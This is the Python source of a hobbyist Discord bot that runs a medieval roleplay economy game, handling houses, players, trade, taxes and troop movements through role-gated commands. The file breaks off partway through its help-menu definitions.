import random, discord
from discord.ext.commands import Bot
# custom database handler
from db import *
from time import sleep
from random import choice


# --------- Info and general informations -----------



"""
INFO :

    this is a discord bot, to be used by players in discord to get informations about their specific things,
     stats etc.

    the discord things (ctx module and all) are from the discord API (import discord)

    the database handler is from db/__init__.py

    (the tiny ascii arts are from http://www.ascii.co.uk/art/ )

"""


# --------- BOT CODE BELOW -----------



"""

// INIT

"""

# init json handling and discord
db = house_database_handler("database.json")
BOT_PREFIX = ("]", "?", "/", "\\")
# Oof close your eyes please !
token = "No"
worked = "✅"
someError = "❌"
client = Bot(command_prefix=BOT_PREFIX)



"""

// GLOBAL THINGS

"""

# when a house controls another one, but didnt merge with it
# below for example at "change", they will be able to choose which house they want to change values for
double_house = {
    "house_lancaster": "house_royal",
    "house_anor" : "house_royal"
}

async def getInput(message):
    print("called")
    answer = await client.wait_for('message', check=lambda response : response.author == message.author and response.content.startswith(":") == True)
    answer = answer.content.split(":")[1].strip()
    answer = answer.lower().strip()
    if answer == "abort" or answer == "stop":
        print()
        return ValueError
    return answer

async def sendError(error="error", channel="REE"):
    embed=discord.Embed(title="Error.", description=someError + " " + error, color=0xff0000)
    await channel.send(embed=embed)

async def sendRequest(request=" ", channel="REE"):
    colors = [0xe03ca5, 0xdd7b28, 0x60c842, 0x8ae1c2, 0x008c5a, 0xc5bcc5]
    embed=discord.Embed(title="Request", description=request, color=choice(colors))
    await channel.send(embed=embed)

async def sendEmbed(title="Aha", description="...", channel="REE", color="normal"):
    colors = [0xe03ca5, 0xdd7b28, 0x60c842, 0x8ae1c2, 0x008c5a, 0xc5bcc5]
    color = choice(colors)
    if color == "red":
        color = 0xff0000
    embed=discord.Embed(title=title, description=description, color=choice(colors))
    sent = await channel.send(embed=embed)
    return sent

async def createEmbed(title="Aha", description="...", channel="REE", color="normal"):
    colors = [0xe03ca5, 0xdd7b28, 0x60c842, 0x8ae1c2, 0x008c5a, 0xc5bcc5]
    color = choice(colors)
    if color == "red":
        color = 0xff0000
    embed=discord.Embed(title=title, description=description, color=color)
    return embed

# ~~~ set custom status ~~~
@client.event
async def on_ready(): #The Crown of Selenor
    activity = discord.Game(name="It's a cute cat right")
    await client.change_presence(status=discord.Status.online, activity=activity)
    channel = client.get_channel(653291682791555082)

@client.event
async def on_message(message):
    # check if message is for our bot
    if not(message.content.startswith(BOT_PREFIX)): return 0;
    caseSensitiveCommands = ["grep", "grab","staff1", "changeHouse"]
    usedPrefix = message.content[0]
    print("Chosen Prefix:", usedPrefix)
    # if the command needs case sensitive parameters, such as when entering values from a db
    if message.content.split(usedPrefix)[1].lower().split(" ")[0] in caseSensitiveCommands:
        command = message.content.split(usedPrefix)[1].split(" ")
    else:
        command = message.content.split(usedPrefix)[1].lower().split(" ")


    i = 1
    param = ["None", "None", "None", "None"]

    for i in range(len(command)):
        print(param[i])
        param[i] = command[i]
    print("Used with Parameters", param)

    # for example, prefix is ?, if only writes ? with no intention to use bot
    if param[0] == "None" or param[0] == "":
        return 0

    command = command[0]
    # to use after
    guild = "None"
    channel = message.channel
    server = message.guild
    nickName = message.author.display_name
    memberRoles = [y.name.lower() for y in message.author.roles]

    # requires this to use some commands
    if "staff" in memberRoles: staffMemberRequest = 1
    else: staffMemberRequest = 0
    # requires this to change house values
    if "house leader" in memberRoles: houseManagingPermission = 1
    else: houseManagingPermission = 0
    #
    for i in range(len(memberRoles)):
        if memberRoles[i].lower().startswith("house_"):
            member = memberRoles[i].lower()
            print("Request from", member)

    for i in range(len(memberRoles)):
        if "guild_of_" in memberRoles[i]:
            guildRole = memberRoles[i].split("_")
            print("Got Guild Request from", guildRole)
            print(guildRole)
            guild = guildRole[2]
            print(guild)

    """
    actually start processing the command
    """

    # this handles
    # ["l", "i", "s", "t", "s"]
    # requests

    if command in ["listhouses", "list1"]:
        try:
            x = db.listHouses()
            await channel.send(x)
        except:
            await sendError("Internal Error. Call Admin", channel)

    elif command in ["listusers", "list2"]:
        try:
            x = db.listUsers()
            await channel.send(x)
        except:
            await sendError("Internal Error. Call Admin", channel)

    elif command in ["listguilds", "list3"]:
        try:
            x = db.listGuilds()
            await channel.send(x)
        except:
            await sendError("Internal Error. Call Admin", channel)

    elif command in ["listitems", "list4", "items"]:
        items, prices = db.listItems()
        embed = discord.Embed(title="Available items : ", color=0xffffff)
        for i in range(len(items)):
            embed.add_field(name="Item : "+str(items[i].upper()), value="Price : "+str(prices[i]), inline=False)

        await channel.send(embed=embed)
        return 0

    elif command in ["listcities", "list5", "cities"]:

        rawCityData = db.listCities()
        embed=discord.Embed(title="Cities", description="Current Cities in Selenor", color=0xffffff)
        houses = list(rawCityData.keys())

        for i in range(len(houses)):
            houseName = houses[i]
            houseReport = ""
            for innerIndex in range(len(rawCityData[houseName])):
                cityName = rawCityData[houseName][innerIndex][0]
                cityCoordinates = rawCityData[houseName][innerIndex][1]
                houseReport = houseReport + "\nCity : "+str(cityName)+"    Coordinates : "+str(cityCoordinates)
            # ex if hosue has no cities as they got captured or so
            if houseReport == "": continue
            embed.add_field(name="House "+houseName, value=houseReport, inline=True)

        await channel.send(embed=embed)
        return 0

        """

            // USER THINGS

                  ___I_
                 /\-_--\
                /  \_-__\
                |[]| [] |


        """

    elif command in ["recalibrate", "fuck"]:
        db.recalculate_economy("all")
        await channel.send("ok")

    elif command in ["buy", "shop"]:
        print(member)
        coor = ""
        # default
        cityName = "None"
        item = param[1] ; amount = param[2]
        if houseManagingPermission == 0 : await sendError("House leader only.", channel) ; return 0
        # if he doesnt specify, just list items
        if item == "None":
            items, prices = db.listItems()
            embed = discord.Embed(title="Available items : ", color=0xffffff)
            for i in range(len(items)):
                embed.add_field(name="Item : "+str(items[i].upper()), value="Price : "+str(prices[i]), inline=False)

            await channel.send(embed=embed)
            return 0
        # he can buy more, but first, lets go with 1 by default
        if item != "None" and amount == "None":
            amount = 1

        try:
            if double_house[member]:
                print(double_house[member])
                await sendRequest("Buy from "+ str(member) + " or " + str(double_house[member]) + " [1/2] :", channel)
                sleep(0.1)
                memberChoice = await getInput(message)
                print(memberChoice)
                if memberChoice != "1" and memberChoice != "2":
                    await sendError("Aborted.")
                    return 1
                elif memberChoice == "2":
                    member = double_house[member]

        except:
            pass


        if item == "city":
            amount = 1
            await sendRequest("City Name", channel)
            cityName = await getInput(message)
            print(cityName)

            await sendRequest("City Coordinates, format : X;Y", channel)
            rawCoor = await getInput(message)
            coor = rawCoor.split(";")
            coor = (int(coor[0]), int(coor[1]))

        request = db.buyItem(member, item, amount, "info")
        await channel.send(request)
        if "error" in request.lower(): return -1
        yOrNo = await getInput(message)
        if yOrNo != "y" and yOrNo != "yes":
            await sendError("Abort.", channel)
            return 1
        print(member)
        tryOrFail = db.buyItem(member, item, amount, "normal", cityName, coor)
        await channel.send(tryOrFail)


    elif command in ["stats", "population"]:
        city = "None"
        if staffMemberRequest == 1:
            member = param[1]
        if staffMemberRequest == 1 and param[2] != "None":
            city = param[2]
        if staffMemberRequest == 0 and param[1] != "None":
            city = param[1]
        print(city)

        try:
            if double_house[member]:
                print(double_house[member])
                await channel.send("First for " + str(double_house[member]))
                info = db.lookFor(double_house[member],"house", "normal", None, None, city)
                await channel.send(info)
        except:
            pass

        # by default return an error, this is just when staff calls command without precising
        if staffMemberRequest == 1 and member == "None":
            await sendError("Enter a name too", channel)
            return "error"
        # obsolete
        print("looking for ", member)
        info = db.lookFor(member, "house", "normal", None, None, city)
        await channel.send(info)


    elif command in ["inventory", "stuff", "backpack"]:
        house = param[1]
        print(house)
        if staffMemberRequest == 1 and house=="None":
            await channel.send("`Use as \\inventory house_name`")
        elif staffMemberRequest == 1: member = house

        member = member.lower().strip()
        print("looking inventory for ", member)
        request = db.inventory(member)
        if "empty" in request:
            await sendError(r"Inventory empty O_o Buy something !", channel)
            return 0
        itemNames = list(request.keys())
        print(itemNames[0])
        # ey im actually kinda happy that worked !!

        embed = discord.Embed(title="Inventory for "+str(member)+" : ", color=0xffffff)
        for i in range(len(request)):
            embed.add_field(name="Item : "+str(itemNames[i].upper()), value="Amount : "+str(request[itemNames[i]]), inline=False)

        await channel.send(embed=embed)
        return 0

    elif command in ["me", "personal"]:
        if param[1] != "change": param[1] = "normal"
        mode = param[1] ; value = param[2]; amount = param[3]
        member = nickName.lower().strip()

        # can change with same command
        if mode == "change" and value != "None" and amount != "None":
            if int(amount) > 3 and not(houseManagingPermission):
                await sendError("Max 3 guards.", channel)
                return 1
            if int(amount) > 5 and not("royal_administration" in memberRoles):
                await sendError("Max 5 guards", channel)
                return 1

            await sendRequest("Sure [y/N]", channel)
            yOrNo = await getInput(message)
            if yOrNo != "y" and yOrNo != "yes":
                await sendError("Abort", channel)
                return 1
            amount = int(amount)
            info = db.lookFor(member, "personal", mode, value, amount)
            await channel.send(info)
        gender, info = db.lookFor(member, "personal", mode, None, None)

        embed = discord.Embed(title="Player "+str(member)+" ("+gender+"): ", color=0x1840ee)
        for i in range(len(info[0])):
            if "none" in str(info[1][i]).lower(): continue
            embed.add_field(name=str(info[0][i]), value=str(info[1][i]), inline=False)
        await channel.send(embed=embed)



    elif command in ["travel", "move"]:
        destination = param[1]
        member = nickName.lower().strip()
        if destination == "None":
            await sendRequest("Enter Destionation : ", channel)
            destination = await getInput(message)

        print("looking for ", member)
        print(destination)
        request = db.travel(member, destination)
        await channel.send(request)
        return 0

    elif command in ["movetroops", "troops", "traveltroops"]:
        if houseManagingPermission == 0 and staffMemberRequest == 0:
            await sendError("House leader only.", channel)
            return 0
        # check all needed variables
        cityFrom = param[1]
        destination = param[2]
        troopsAmount = param[3]

        if cityFrom == "None":
            await channel.send("`INFO : Must be one of your cities, please enter the exact name.\n(If unsure, check \\stats or ask staff.)`")
            await sendRequest("City to take troops from : ", channel)
            cityFrom = await getInput(message)

        if destination == "None":
            await channel.send("`INFO : Must be a city name, please enter the exact name.\n(If unsure, check out \\cities or ask a player/staff.)`")
            await sendRequest("Enter Destionation : ", channel)
            destination = await getInput(message)

        if troopsAmount == "None":
            await sendRequest("Number of soldiers: ", channel)
            troopsAmount = await getInput(message)
        try:
            troopsAmount = int(troopsAmount)
        except:
            await sendError("Amount needs to be integer.")
            return

        travelTroops = db.travelTroops(member, cityFrom, destination, troopsAmount)
        if "error" in travelTroops:
            await sendError(travelTroops, channel)
        else:
            await sendEmbed(worked, travelTroops, channel)

    elif command in ["listtroops", "listmovements", "movements"]:
        """
        ### currently not listing per city but per house
        cityToList = param[1]
        if cityToList == "None":
            await sendRequest("City check current movements : ", channel)
            cityToList = await getInput(message)
        """

        if staffMemberRequest == 1:
            mode = "staff"
            await sendRequest("Enter house : ", channel)
            member = await getInput(message)

        else:
            mode = "house"
        # if houseleader, only list from your house, staff is from any house
        cityMovementList = db.listMovements(member, mode)

        if "error" in cityMovementList:
            await sendError(cityMovementList, channel)
        else:
            await channel.send(cityMovementList)

    elif command in ["cleartroops", "clearmovement"]:
        if staffMemberRequest == 0:
            await sendError("Staff only", channel)
            return
        member = param[1]
        cityToClearFrom = param[2]
        movementID = param[3]
        if member == "None":
            await sendRequest("House : ", channel)
            member = await getInput(message)
        if cityToClearFrom == "None":
            await sendRequest("City to clear from : ", channel)
            cityToClearFrom = await getInput(message)
        if movementID == "None":
            await sendRequest("Movement ID : ", channel)
            movementID = await getInput(message)

        beSafe = db.clearMovement(member, cityToClearFrom, movementID, "safe")
        await sendRequest(beSafe, channel)
        beSafeRespond = await getInput(message)
        if beSafeRespond not in ["y", "yes"]:
            await sendError("Abort.", channel)
            return

        clearStatus = db.clearMovement(member, cityToClearFrom, movementID)

        if "error" in clearStatus:
            await sendError(clearStatus, channel)
        else:
            await sendEmbed("💥", clearStatus, channel)

    elif command in ["guild", "guildinfo"]:
        guildParam = param[1]
        if guildParam == "None" and guild == "None":
            await sendError("Give guild to look for", channel)
            return 1
        if staffMemberRequest == 1:
            guild = guildParam

        info = db.lookFor(guild, "guilds", "None", "None", "None")
        await channel.send(str(info))

    elif command in ["send", "pay"]:
        if houseManagingPermission == 0: await sendError("house leader only.", channel) ; return 0
        moneyReceiver = param[1] ; amount = param[2]
        moneySender = member

        if moneyReceiver == "None" or amount == "None":
            await sendError("Error - use the command as\n\\send TO AMOUNT", channel)
            return -1
        try:
            amount = int(amount)
        except:
            await sendError("Invalid number", channel)
            return -1

        try:
            if double_house[moneySender]:
                print(double_house[moneySender])
                await sendRequest("Send money from "+ str(moneySender) + " or " + str(double_house[moneySender]) + " [1/2] :", channel)
                sleep(0.1)
                houseChoice = await getInput(message)

                houseChoice = houseChoice
                if houseChoice != "1" and houseChoice != "2":
                    await sendError("Aborted.")
                    return 1
                elif houseChoice == "2":
                    houseRole = double_house[moneySender]
                moneySender = houseRole

                await sendRequest("Amount", channel)
                sleep(0.1)
                oneMoreThing = await getInput(message)

                amount = oneMoreThing

                await sendRequest("Receiver", channel)
                sleep(0.1)
                oneMoreThing = await getInput(message)

                moneyReceiver = oneMoreThing

        except:
            pass

        x = db.listHouses()
        if moneyReceiver not in x:
            mode = "guilds"
        else:
            mode = "houses"
        amount = int(amount)

        #  check again
        await sendRequest("Sending " + str(amount)+ " goldpiece from your house to " + str(moneyReceiver) +".\nConfirm and Checkout ? [y/N]", channel)
        yOrNo = await getInput(message)
        if yOrNo != "y" and yOrNo != "yes":
            await sendError("Abort.", channel)
            return 1
        await sendEmbed("Processing request.", "...",channel)
        try:
            sendMoney = db.sendMoney(moneySender, moneyReceiver, amount, mode)
            await sendEmbed("Report", sendMoney, channel)
        except:
            await sendError("Error.", channel)

    elif command in ["change"]:
        if houseManagingPermission == 0 : await sendError("House Leaders only.", channel) ; return 0

        houseRole = member
        print(memberRoles)
        ARMY_SALARY = 100 # useless, obsolete ? maybe..

        try:
            if double_house[houseRole]:
                print(double_house[houseRole])
                await sendRequest("Change values for "+ str(houseRole) + " or " + str(double_house[houseRole]) + " [1/2] :", channel)
                sleep(0.1)
                houseChoice = await getInput(message)

                houseChoice = houseChoice
                if houseChoice != "1" and houseChoice != "2":
                    await sendError("Aborted.")
                    return 1
                elif houseChoice == "2":
                    member = double_house[member]
        except:
            pass

        """
        await sendRequest("Are you sure you want to change values for "+ str(member) + " [y/N] :", channel)
        sleep(0.1)
        answer = await getInput(message)
        if answer != "y" and answer != "yes":
            await sendError("Aborted.", channel)
            return 1
        """

        sleep(1)
        await sendRequest("Which value do you want to change ? ['army' ; 'taxes']", channel)
        sleep(0.1)
        choice = await getInput(message)
        if choice not in ['army', 'taxes']:
            await sendError("Unknown option. Abort.", channel)

        if choice.lower() == "army":
            salary = ARMY_SALARY
            """
            # currently disabled as the new system is per city
            updated = db.changeSpecific(member, "army", 0, 0, "info")#
            await sendEmbed("Report", "You can afford maximum " + updated + " troops", channel)
            """
            #  new system
            sleep(0.5)
            await channel.send("**INFO**: `You can train troops from a specific city, where the soldiers will be deployed once trained (after 2 days). Thus, you cannot deploy all your troops at once in one city.`")
            await sendRequest("City to train troops from : ", channel)
            sleep(0.1)

            cityToTrainFrom = (await getInput(message))

            updated = db.changeSpecific(member, "army", 0, 0, "info", cityToTrainFrom)#
            if "END" in updated:
                await sendError("Error. City not found.")
                return
            await sendEmbed("Report", "You can afford maximum " + updated + " troops", channel)

            sleep(0.5)
            await sendRequest("Amount of : " + choice, channel)
            sleep(0.1)

            try:
                amount = int(await getInput(message))
            except:
                await sendError("hmmm", channel)
                return "error"


            # calculate future salary here
            futureSalary = salary * amount
            # inform the senders
            await sendRequest("New ARMY Expenses : \n- " + str(futureSalary) + " gold pieces.\nProceed & checkout ? [y/N]", channel)
            sleep(0.1)

        elif choice == "taxes":
            salary = 0
            sleep(0.5)
            await sendRequest("Which value do you want to change ? \n lower or middle or upper ?", channel)
            sleep(0.1)
            choice = await getInput(message)
            if "lower" in choice.lower():
                choice = "lowerClassTax"
            elif "middle" in choice.lower():
                choice = "middleClassTax"
            elif "upper" in choice.lower():
                choice = "upperClassTax"
            if choice not in ['lowerClassTax' , 'middleClassTax' , 'upperClassTax']:
                await sendError("Error, not found (check capital letters)", channel)
                return -1

            sleep(0.5)
            await sendRequest("New taxes for : " + choice + " (goldpieces)", channel)
            sleep(0.1)

            amount = int(await getInput(message))

            # calculate future salary here
            futureSalary = 0
            # inform the sender
            await sendRequest("Proceed & checkout ? [y/N]", channel)
            sleep(0.1)

        #  check again
        yOrNo = await getInput(message)
        if yOrNo != "y" and yOrNo != "yes":
            await sendError("Abort.", channel)
            return 1
        await sendEmbed("processing request.", "...", channel)
        print("Processing for ", member, "\nWants to change ", choice, ", ", amount)
        # use the database handler
        updated = db.changeSpecific(member, choice, amount, futureSalary, "normal", cityToTrainFrom)
        # and its all done ! lets inform the user
        # // or if there was an error returned, send error message
        await channel.send(updated)

        """

        // START OF STAFF ONLY
                GET OFF MY PROPERTY
            ___
         __(   )====::
        /~~~~~~~~~\
        \O.O.O.O.O/

        """

    elif command in ["update", "updateall"]:
        if staffMemberRequest == 0: await sendError("Staff only.", channel) ; return 0

        await sendRequest("Sure [y/N]", channel)
        yOrNo = await getInput(message)
        if yOrNo != "y" and yOrNo != "yes":
            await sendError("Abort.", channel)
            return 1

        await sendEmbed("processing request.", ". . .", channel)
        db.updateAll()
        await channel.send(worked)

    elif command in ["changehouse", "staff1"]:
        if staffMemberRequest == 0: await sendError("Staff only.", channel) ; return 0

        houseRole = param[1] ; choice = param[2] ; amount = param[3]

        if houseRole == "None" or choice == "None" or amount == "None":
            await sendError("Use as \\staff1 house_name choice newValue", channel)
            return 0
        try:
            amount = float(amount)
        except:
            pass
        #  check again
        await sendRequest("Sure [y/N]", channel)
        yOrNo = await getInput(message)
        if yOrNo != "y" and yOrNo != "yes":
            await sendError("Abort.", channel)
            return 1
        await sendEmbed("processing request.", ". . .",channel)
        print("Processing for ", houseRole, "\nWants to change ", choice, ", ", amount)
        # use the database handler
        updated = db.changeSpecific(houseRole, choice, amount, 0)
        # and its all done ! lets inform the user
        # // or if there was an error returned, send error message
        await channel.send(updated)

    elif command in ["changeplayer", "changeuser", "staff2"]:
        if staffMemberRequest == 0: await sendError("Staff only", channel) ; return 0

        await sendRequest("player to change :", channel)
        sleep(0.1)
        houseRole = await getInput(message)
        await sendRequest("value to change :", channel)
        sleep(0.1)
        choice = await getInput(message)
        await sendRequest("new value :", channel)
        sleep(0.1)
        amount = await getInput(message)
        try:
            amount = float(amount)
        except:
            pass
        #  check again
        await sendRequest("Sure [y/N]", channel)
        yOrNo = await getInput(message)
        if yOrNo != "y" and yOrNo != "yes":
            await sendError("Abort.", channel)
            return 1
        await sendEmbed("processing request.", "...", channel)
        print("Processing for ", houseRole, "\nWants to change ", choice, ", ", amount)
        # use the database handler
        updated = db.changeSpecific(houseRole, choice, amount, 0, "players")
        # and its all done ! lets inform the user
        # // or if there was an error returned, send error message
        await channel.send(updated)

    elif command in ["inituser", "init_user", "init2"]:
        if staffMemberRequest == 0: await sendError("Staff only.", channel) ; return 0

        playerType = param[1]
        playerGender = param[2]
        if playerType not in ["kid", "adult", "child"]:
            await sendError("Enter kid or adult as 1st parameter", channel)
            return

        if playerGender not in ["male", "female"]:
            await sendError("Enter man or woman as 2nd parameter", channel)
            return

        await sendRequest("NICKNAME of player :", channel)
        name = await getInput(message)

        sleep(0.5)
        await sendRequest("house_ROLE of player :", channel)
        house = await getInput(message)

        sleep(0.5)
        await sendRequest("father nickname of player (none for a bastard):", channel)
        father = await getInput(message)

        sleep(0.5)
        await sendRequest("mother nickname of player (none for a bastard):", channel)
        mother = await getInput(message)

        if playerType in ["kid", "child"]:
            age = 16
        elif playerType in ["adult"]:
            age = 21
        else:
            # this is literally impossible
            pass

        attack = random.randint(1, 6) + 7
        counterStats = random.randint(1, 6) + 7
        equipment = "basic sword"
        dexterity = random.randint(1, 6) + 7
        assassinationCapacity = random.randint(1, 6) + 7
        guards = 1
        marriageStatus = "sad alone"
        marriedWith = "None"
        directChild = "None"

        # all setup, check one last time
        await sendRequest("Create user (YES or no)", channel)
        askHim = await getInput(message)

        if askHim == "yes" or askHim == "y":
            # this is a loooot of variables lmao
            db.createUser(name, house, age, attack, counterStats, equipment, dexterity, assassinationCapacity, guards, playerGender, marriageStatus, marriedWith, directChild, father, mother)
            await channel.send(worked)
        else:
            await sendError("aborted", channel)

    elif command in ["inithouse", "init_house", "init1", "createhouse"]:
        if staffMemberRequest == 0: await sendError("Staff only.", channel) ; return 0

        house_name = param[1]
        houseType = param[2]

        if house_name == "None":
            await sendError("Please enter a name too", channel)
            return 0
        if houseType == "None" or houseType not in ["major", "minor"]:
            await sendError("Please enter major/minor (determines immigration)", channel)
            return 0

        await sendRequest("Village name :", channel)
        villageName = await getInput(message)

        sleep(0.5)

        await sendRequest("Village coordinates in format X;Y (ex 5;6):", channel)
        village = await getInput(message)

        villageCoordinates = village.split(";")
        villageCoordinates = (int(villageCoordinates[0]), int(villageCoordinates[1]))#
        """
            calculating
        """
        # population
        diceResult = db.dice(100, 20)
        population = diceResult * 10

        natality = 5 / 100
        childrenRate = db.dice(1, 7) / 100
        elderlyRate = db.dice(1, 7) / 100
        mortality = 5 / 100
        popularity = 80 / 100
        if houseType == "major": immigration = 40 / 100
        elif houseType == "minor": immigration = 10 / 100
        diceResult = db.dice(1, 20)
        menPart = (diceResult + 40) / 100

        lowerClassRate = db.dice(1, 30) / 100
        upperClassRate = db.dice(1, 6) / 100
        lowerClassTax = 10
        middleClassTax = 10
        upperClassTax = 10
        army = 0
        guildTax, vassalTax, lordTax, knights, squires, guards = 0, 0, 0, 0, 0, 0
        totalGold = 50000

        # calculating the actual amounts out of the rates
        children = int((childrenRate) * population)
        elderly = int((elderlyRate) * population)
        workingPopulation = int(population - children - elderly)
        womenPart = 1 - menPart
        men = int((menPart) * workingPopulation)
        women = int(workingPopulation - men)
        lowerClass = int((lowerClassRate) * workingPopulation)
        upperClass = int((upperClassRate) * workingPopulation)
        middleClass = int(workingPopulation - lowerClass - upperClass)
        income = 0
        expenses = 0

        """
            Processing with the database stuff
        """


        # all setup, check one last time
        await sendRequest("Create house (YES or no)", channel)
        askHim = await getInput(message)

        if askHim == "yes" or askHim == "y":
            # this is a loooot of variables lmao
            await sendEmbed("processing request", ". . .", channel)
            request = db.createHouse(house_name, population, natality, childrenRate, elderlyRate, mortality, popularity, children, elderly, workingPopulation, menPart, womenPart, men, women, lowerClassRate, upperClassRate, lowerClassTax, middleClassTax, upperClassTax, lowerClass, middleClass, upperClass, army, guildTax, vassalTax, lordTax, income, expenses, totalGold, knights, guards, squires, villageName, villageCoordinates, houseType, immigration)
            if "error" in request:
                await sendError(request, channel)
                return -1
            # we have created the house values
            # now we create the channels
            await server.create_category(house_name)
            await server.create_role(name=house_name)
            x = await server.create_role(name="village-"+villageName)
            print(x)

            newCategory = discord.utils.get(server.categories, name=house_name)

            newRpRole = x
            print("village-"+villageName, "\n", x, "\n", newRpRole)
            moderators = discord.utils.get(server.roles, name="Moderator")
            newHouseRole = discord.utils.get(server.roles, name=house_name)
            print(newHouseRole)
            print(newRpRole)

            houseChannelName = house_name.split("_")

            await server.create_text_channel("Village-" + villageName + "-MENU", category=newCategory)
            newChannel = discord.utils.get(server.channels, name="village-" + villageName + "-menu")
            await newChannel.set_permissions(server.default_role, read_messages=False, send_messages=False)
            await newChannel.set_permissions(newRpRole, read_messages=True, send_messages=True)
            await newChannel.set_permissions(moderators, read_messages=True, send_messages=True)

            await server.create_text_channel("Village-" + villageName + "-RP", category=newCategory)
            newChannel = discord.utils.get(server.channels, name="village-" + villageName + "-rp")
            await newChannel.set_permissions(server.default_role, read_messages=False, send_messages=False)
            await newChannel.set_permissions(newRpRole, read_messages=True, send_messages=True)
            await newChannel.set_permissions(moderators, read_messages=True, send_messages=True)

            await server.create_text_channel("House-" + houseChannelName[1] + "-BOT", category=newCategory)
            newChannel = discord.utils.get(server.channels, name="house-" + houseChannelName[1] + "-bot")
            await newChannel.set_permissions(server.default_role, read_messages=False, send_messages=False)
            await newChannel.set_permissions(newHouseRole, read_messages=True, send_messages=True)
            await newChannel.set_permissions(moderators, read_messages=True, send_messages=True)

            await server.create_text_channel( houseChannelName[1] + "-map", category=newCategory)
            newChannel = discord.utils.get(server.channels, name=houseChannelName[1] + "-map")
            await newChannel.set_permissions(server.default_role, read_messages=False, send_messages=False)
            await newChannel.set_permissions(newHouseRole, read_messages=True, send_messages=True)
            await newChannel.set_permissions(moderators, read_messages=True, send_messages=True)

            await server.create_text_channel( houseChannelName[1] + "-global-administration", category=newCategory)
            newChannel = discord.utils.get(server.channels, name=houseChannelName[1] + "-global-administration")
            await newChannel.set_permissions(server.default_role, read_messages=False, send_messages=False)
            await newChannel.set_permissions(newHouseRole, read_messages=True, send_messages=True)
            await newChannel.set_permissions(moderators, read_messages=True, send_messages=True)

            await channel.send(worked)

        else:
            await sendError("aborted", channel)

    elif command in ["user", "player"]:
        if staffMemberRequest == 0: await sendError("Staff only.", channel) ; return 0
        print("ree")
        await sendRequest("User to look up : ", channel)
        print("RE")
        user = await getInput(message)
        print(user)
        # TODO
        gender, info = db.lookFor(user, "personal", "normal", None, None, "None")
        embed = discord.Embed(title="Player "+str(user)+" ("+gender+"): ", color=0x1840ee)
        for i in range(len(info[0])):
            if "none" in str(info[1][i]).lower(): continue
            embed.add_field(name=str(info[0][i]), value=str(info[1][i]), inline=False)
        await channel.send(embed=embed)

    elif command in ["merge"]:
        if staffMemberRequest == 0: await sendError("Staff only.", channel) ; return 0

        houseFrom = param[1] ; houseTo = param[2]
        if houseFrom == "None" or houseTo == "None":
            await sendError("use as : \\merge house_from house_to", channel)
            return 0

        # you wont be able to come back..
        await sendError("Merge "  + str(houseFrom) + " with " + str(houseTo) + " ?\nthis will **permanently** delete " + str(houseFrom) + ". [y/N]", channel)
        askHim = await getInput(message)

        print(askHim)
        if askHim == "yes" or askHim == "y":
            # a soul for a soul..
            returned = db.mergeHouses(houseFrom, houseTo)
            await channel.send(returned)
            await channel.send(worked)
        else:
            await sendError("aborted", channel)

    elif command in ["grep", "grab"]:
        if staffMemberRequest == 0: await sendError("Staff only.", channel) ; return 0
        print(param[1])
        house = param[1] ; value = param[2]
        request = db.grepValue(house, value)
        await channel.send(request)

    elif command in ["history"]:
        if staffMemberRequest == 0:
            request = db.travelHistory(nickName)
            await channel.send(request)
            return 0

        await sendRequest("User : (all for all)", channel)
        user = await getInput(message)

        # if user == "all" : handle for all users

        request = db.travelHistory(user)
        await channel.send(request)
        return 0

    elif command in ["man", "manual", "help"]:
        category = param[1]

        if param[1] == "None":
            embed=discord.Embed(title="Manual", description="Command Table :", color=0xdd7b28)
            embed.add_field(name="General : ", value="General commands, lists etc\n--> "+usedPrefix+"man general", inline=False)
            embed.add_field(name="Game : ", value="House and Players related\n--> "+usedPrefix+"man game", inline=False)
            embed.add_field(name="Staff : ", value="Staff related\n--> "+usedPrefix+"man staff", inline=False)
        elif param[1].lower() == "general":
            embed=discord.Embed(title="Manual", description="Category General :", color=0xc5bcc5)
            embed.add_field(name=usedPrefix+"listHouses", value="List Houses\nAliases : "+usedPrefix+"list1", inline=False)
            embed.add_field(name=usedPrefix+"listPlayers", value="List Players\nAliases : "+usedPrefix+"list2", inline=False)
            embed.add_field(name=usedPrefix+"listGuilds", value="List Guilds\nAliases : "+usedPrefix+"list3", inline=False)
            embed.add_field(name=usedPrefix+"items", value="List items and prices in shop\nAliases : "+usedPrefix+"list4", inline=False)
            embed.add_field(name=usedPrefix+"cities", value="List cities and their coordinates\nAliases : "+usedPrefix+"list5", inline=False)

        elif param[1].lower() == "game":
            embed=discord.Embed(title="Manual", description="Category Game :", color=0x8ae1c2)
            embed.add_field(name=usedPrefix+"buy CHOICE AMOUNT", value="HOUSE LEADER ONLY\nBuy things from the inventory\nAliases : "+usedPrefix+"shop", inline=False)
            embed.add_field(name=usedPrefix+"send HOUSE_TO AMOUNT", value="HOUSE LEADER ONLY\nSend money to another house\nAliases : "+usedPrefix+"pay", inline=False)
            embed.add_field(name=usedPrefix+"change", value="HOUSE LEADER ONLY\nChange taxes and army\nAliases : "+usedPrefix+"None", inline=False)
            embed.add_field(name=usedPrefix+"stats", value="Detailed statistics of your house\nAliases : "+usedPrefix+"populatin", inline=False)
            embed.add_field(name=usedPrefix+"inventory", value="List items you bought\nAliases : "+usedPrefix+"stuff", inline=False)
            embed.add_field(name=usedPrefix+"me ( change guards AMOUNT(max3 or 5 for house leader) )", value="Details about your character and change guards\nAliases : "+usedPrefix+"personal", inline=False)
            embed.add_field(name=usedPrefix+"travel", value="Log your travel for staff\nAliases : "+usedPrefix+"move", inline=False)
            embed.add_field(name=usedPrefix+"troops CityFrom CityTo Amount", value="Send soldiers to another city.\nAliases : "+usedPrefix+"moveTroops, travelTroops", inline=False)
            embed.add_field(name=usedPrefix+"movements", value="List all current troop movements of your house.\nAliases : "+usedPrefix+"listMovements, listTroops", inline=False)

            embed.add_field(name=usedPrefix+"guild", value="GUILD MEMBERS ONLY\nAliases : "+usedPrefix+"guildInfo", inline=False)

        elif param[1].lower() == "staff":
            embed=discord.Embed(title="Manual", description="Category Staff :", color=0xffffff)
            embed.add_field(name=usedPrefix+"init_house HOUSE_NAME", value="Create a new house\nAliases : "+usedPrefix+"init1", inline=False)
            embed.add_field(name=usedPrefix+"init_user", value="Create  a new User\nAliases : "+usedPrefix+"init2", inline=False)
            embed.add_field(name=usedPrefix+"user", value="Get Statistics of User\nAliases : "+usedPrefix+"player", inline=False)
            embed.add_field(name=usedPrefix+"grep HOUSE_NAME VALUE", value="Grab a specific value\nAliases : "+usedPrefix+"grab", inline=False)
            embed.add_field(name=usedPrefix+"recalibrate", value="Recalibrate and recalculate economy section\nAliases : "+usedPrefix+"fuck", inline=False)
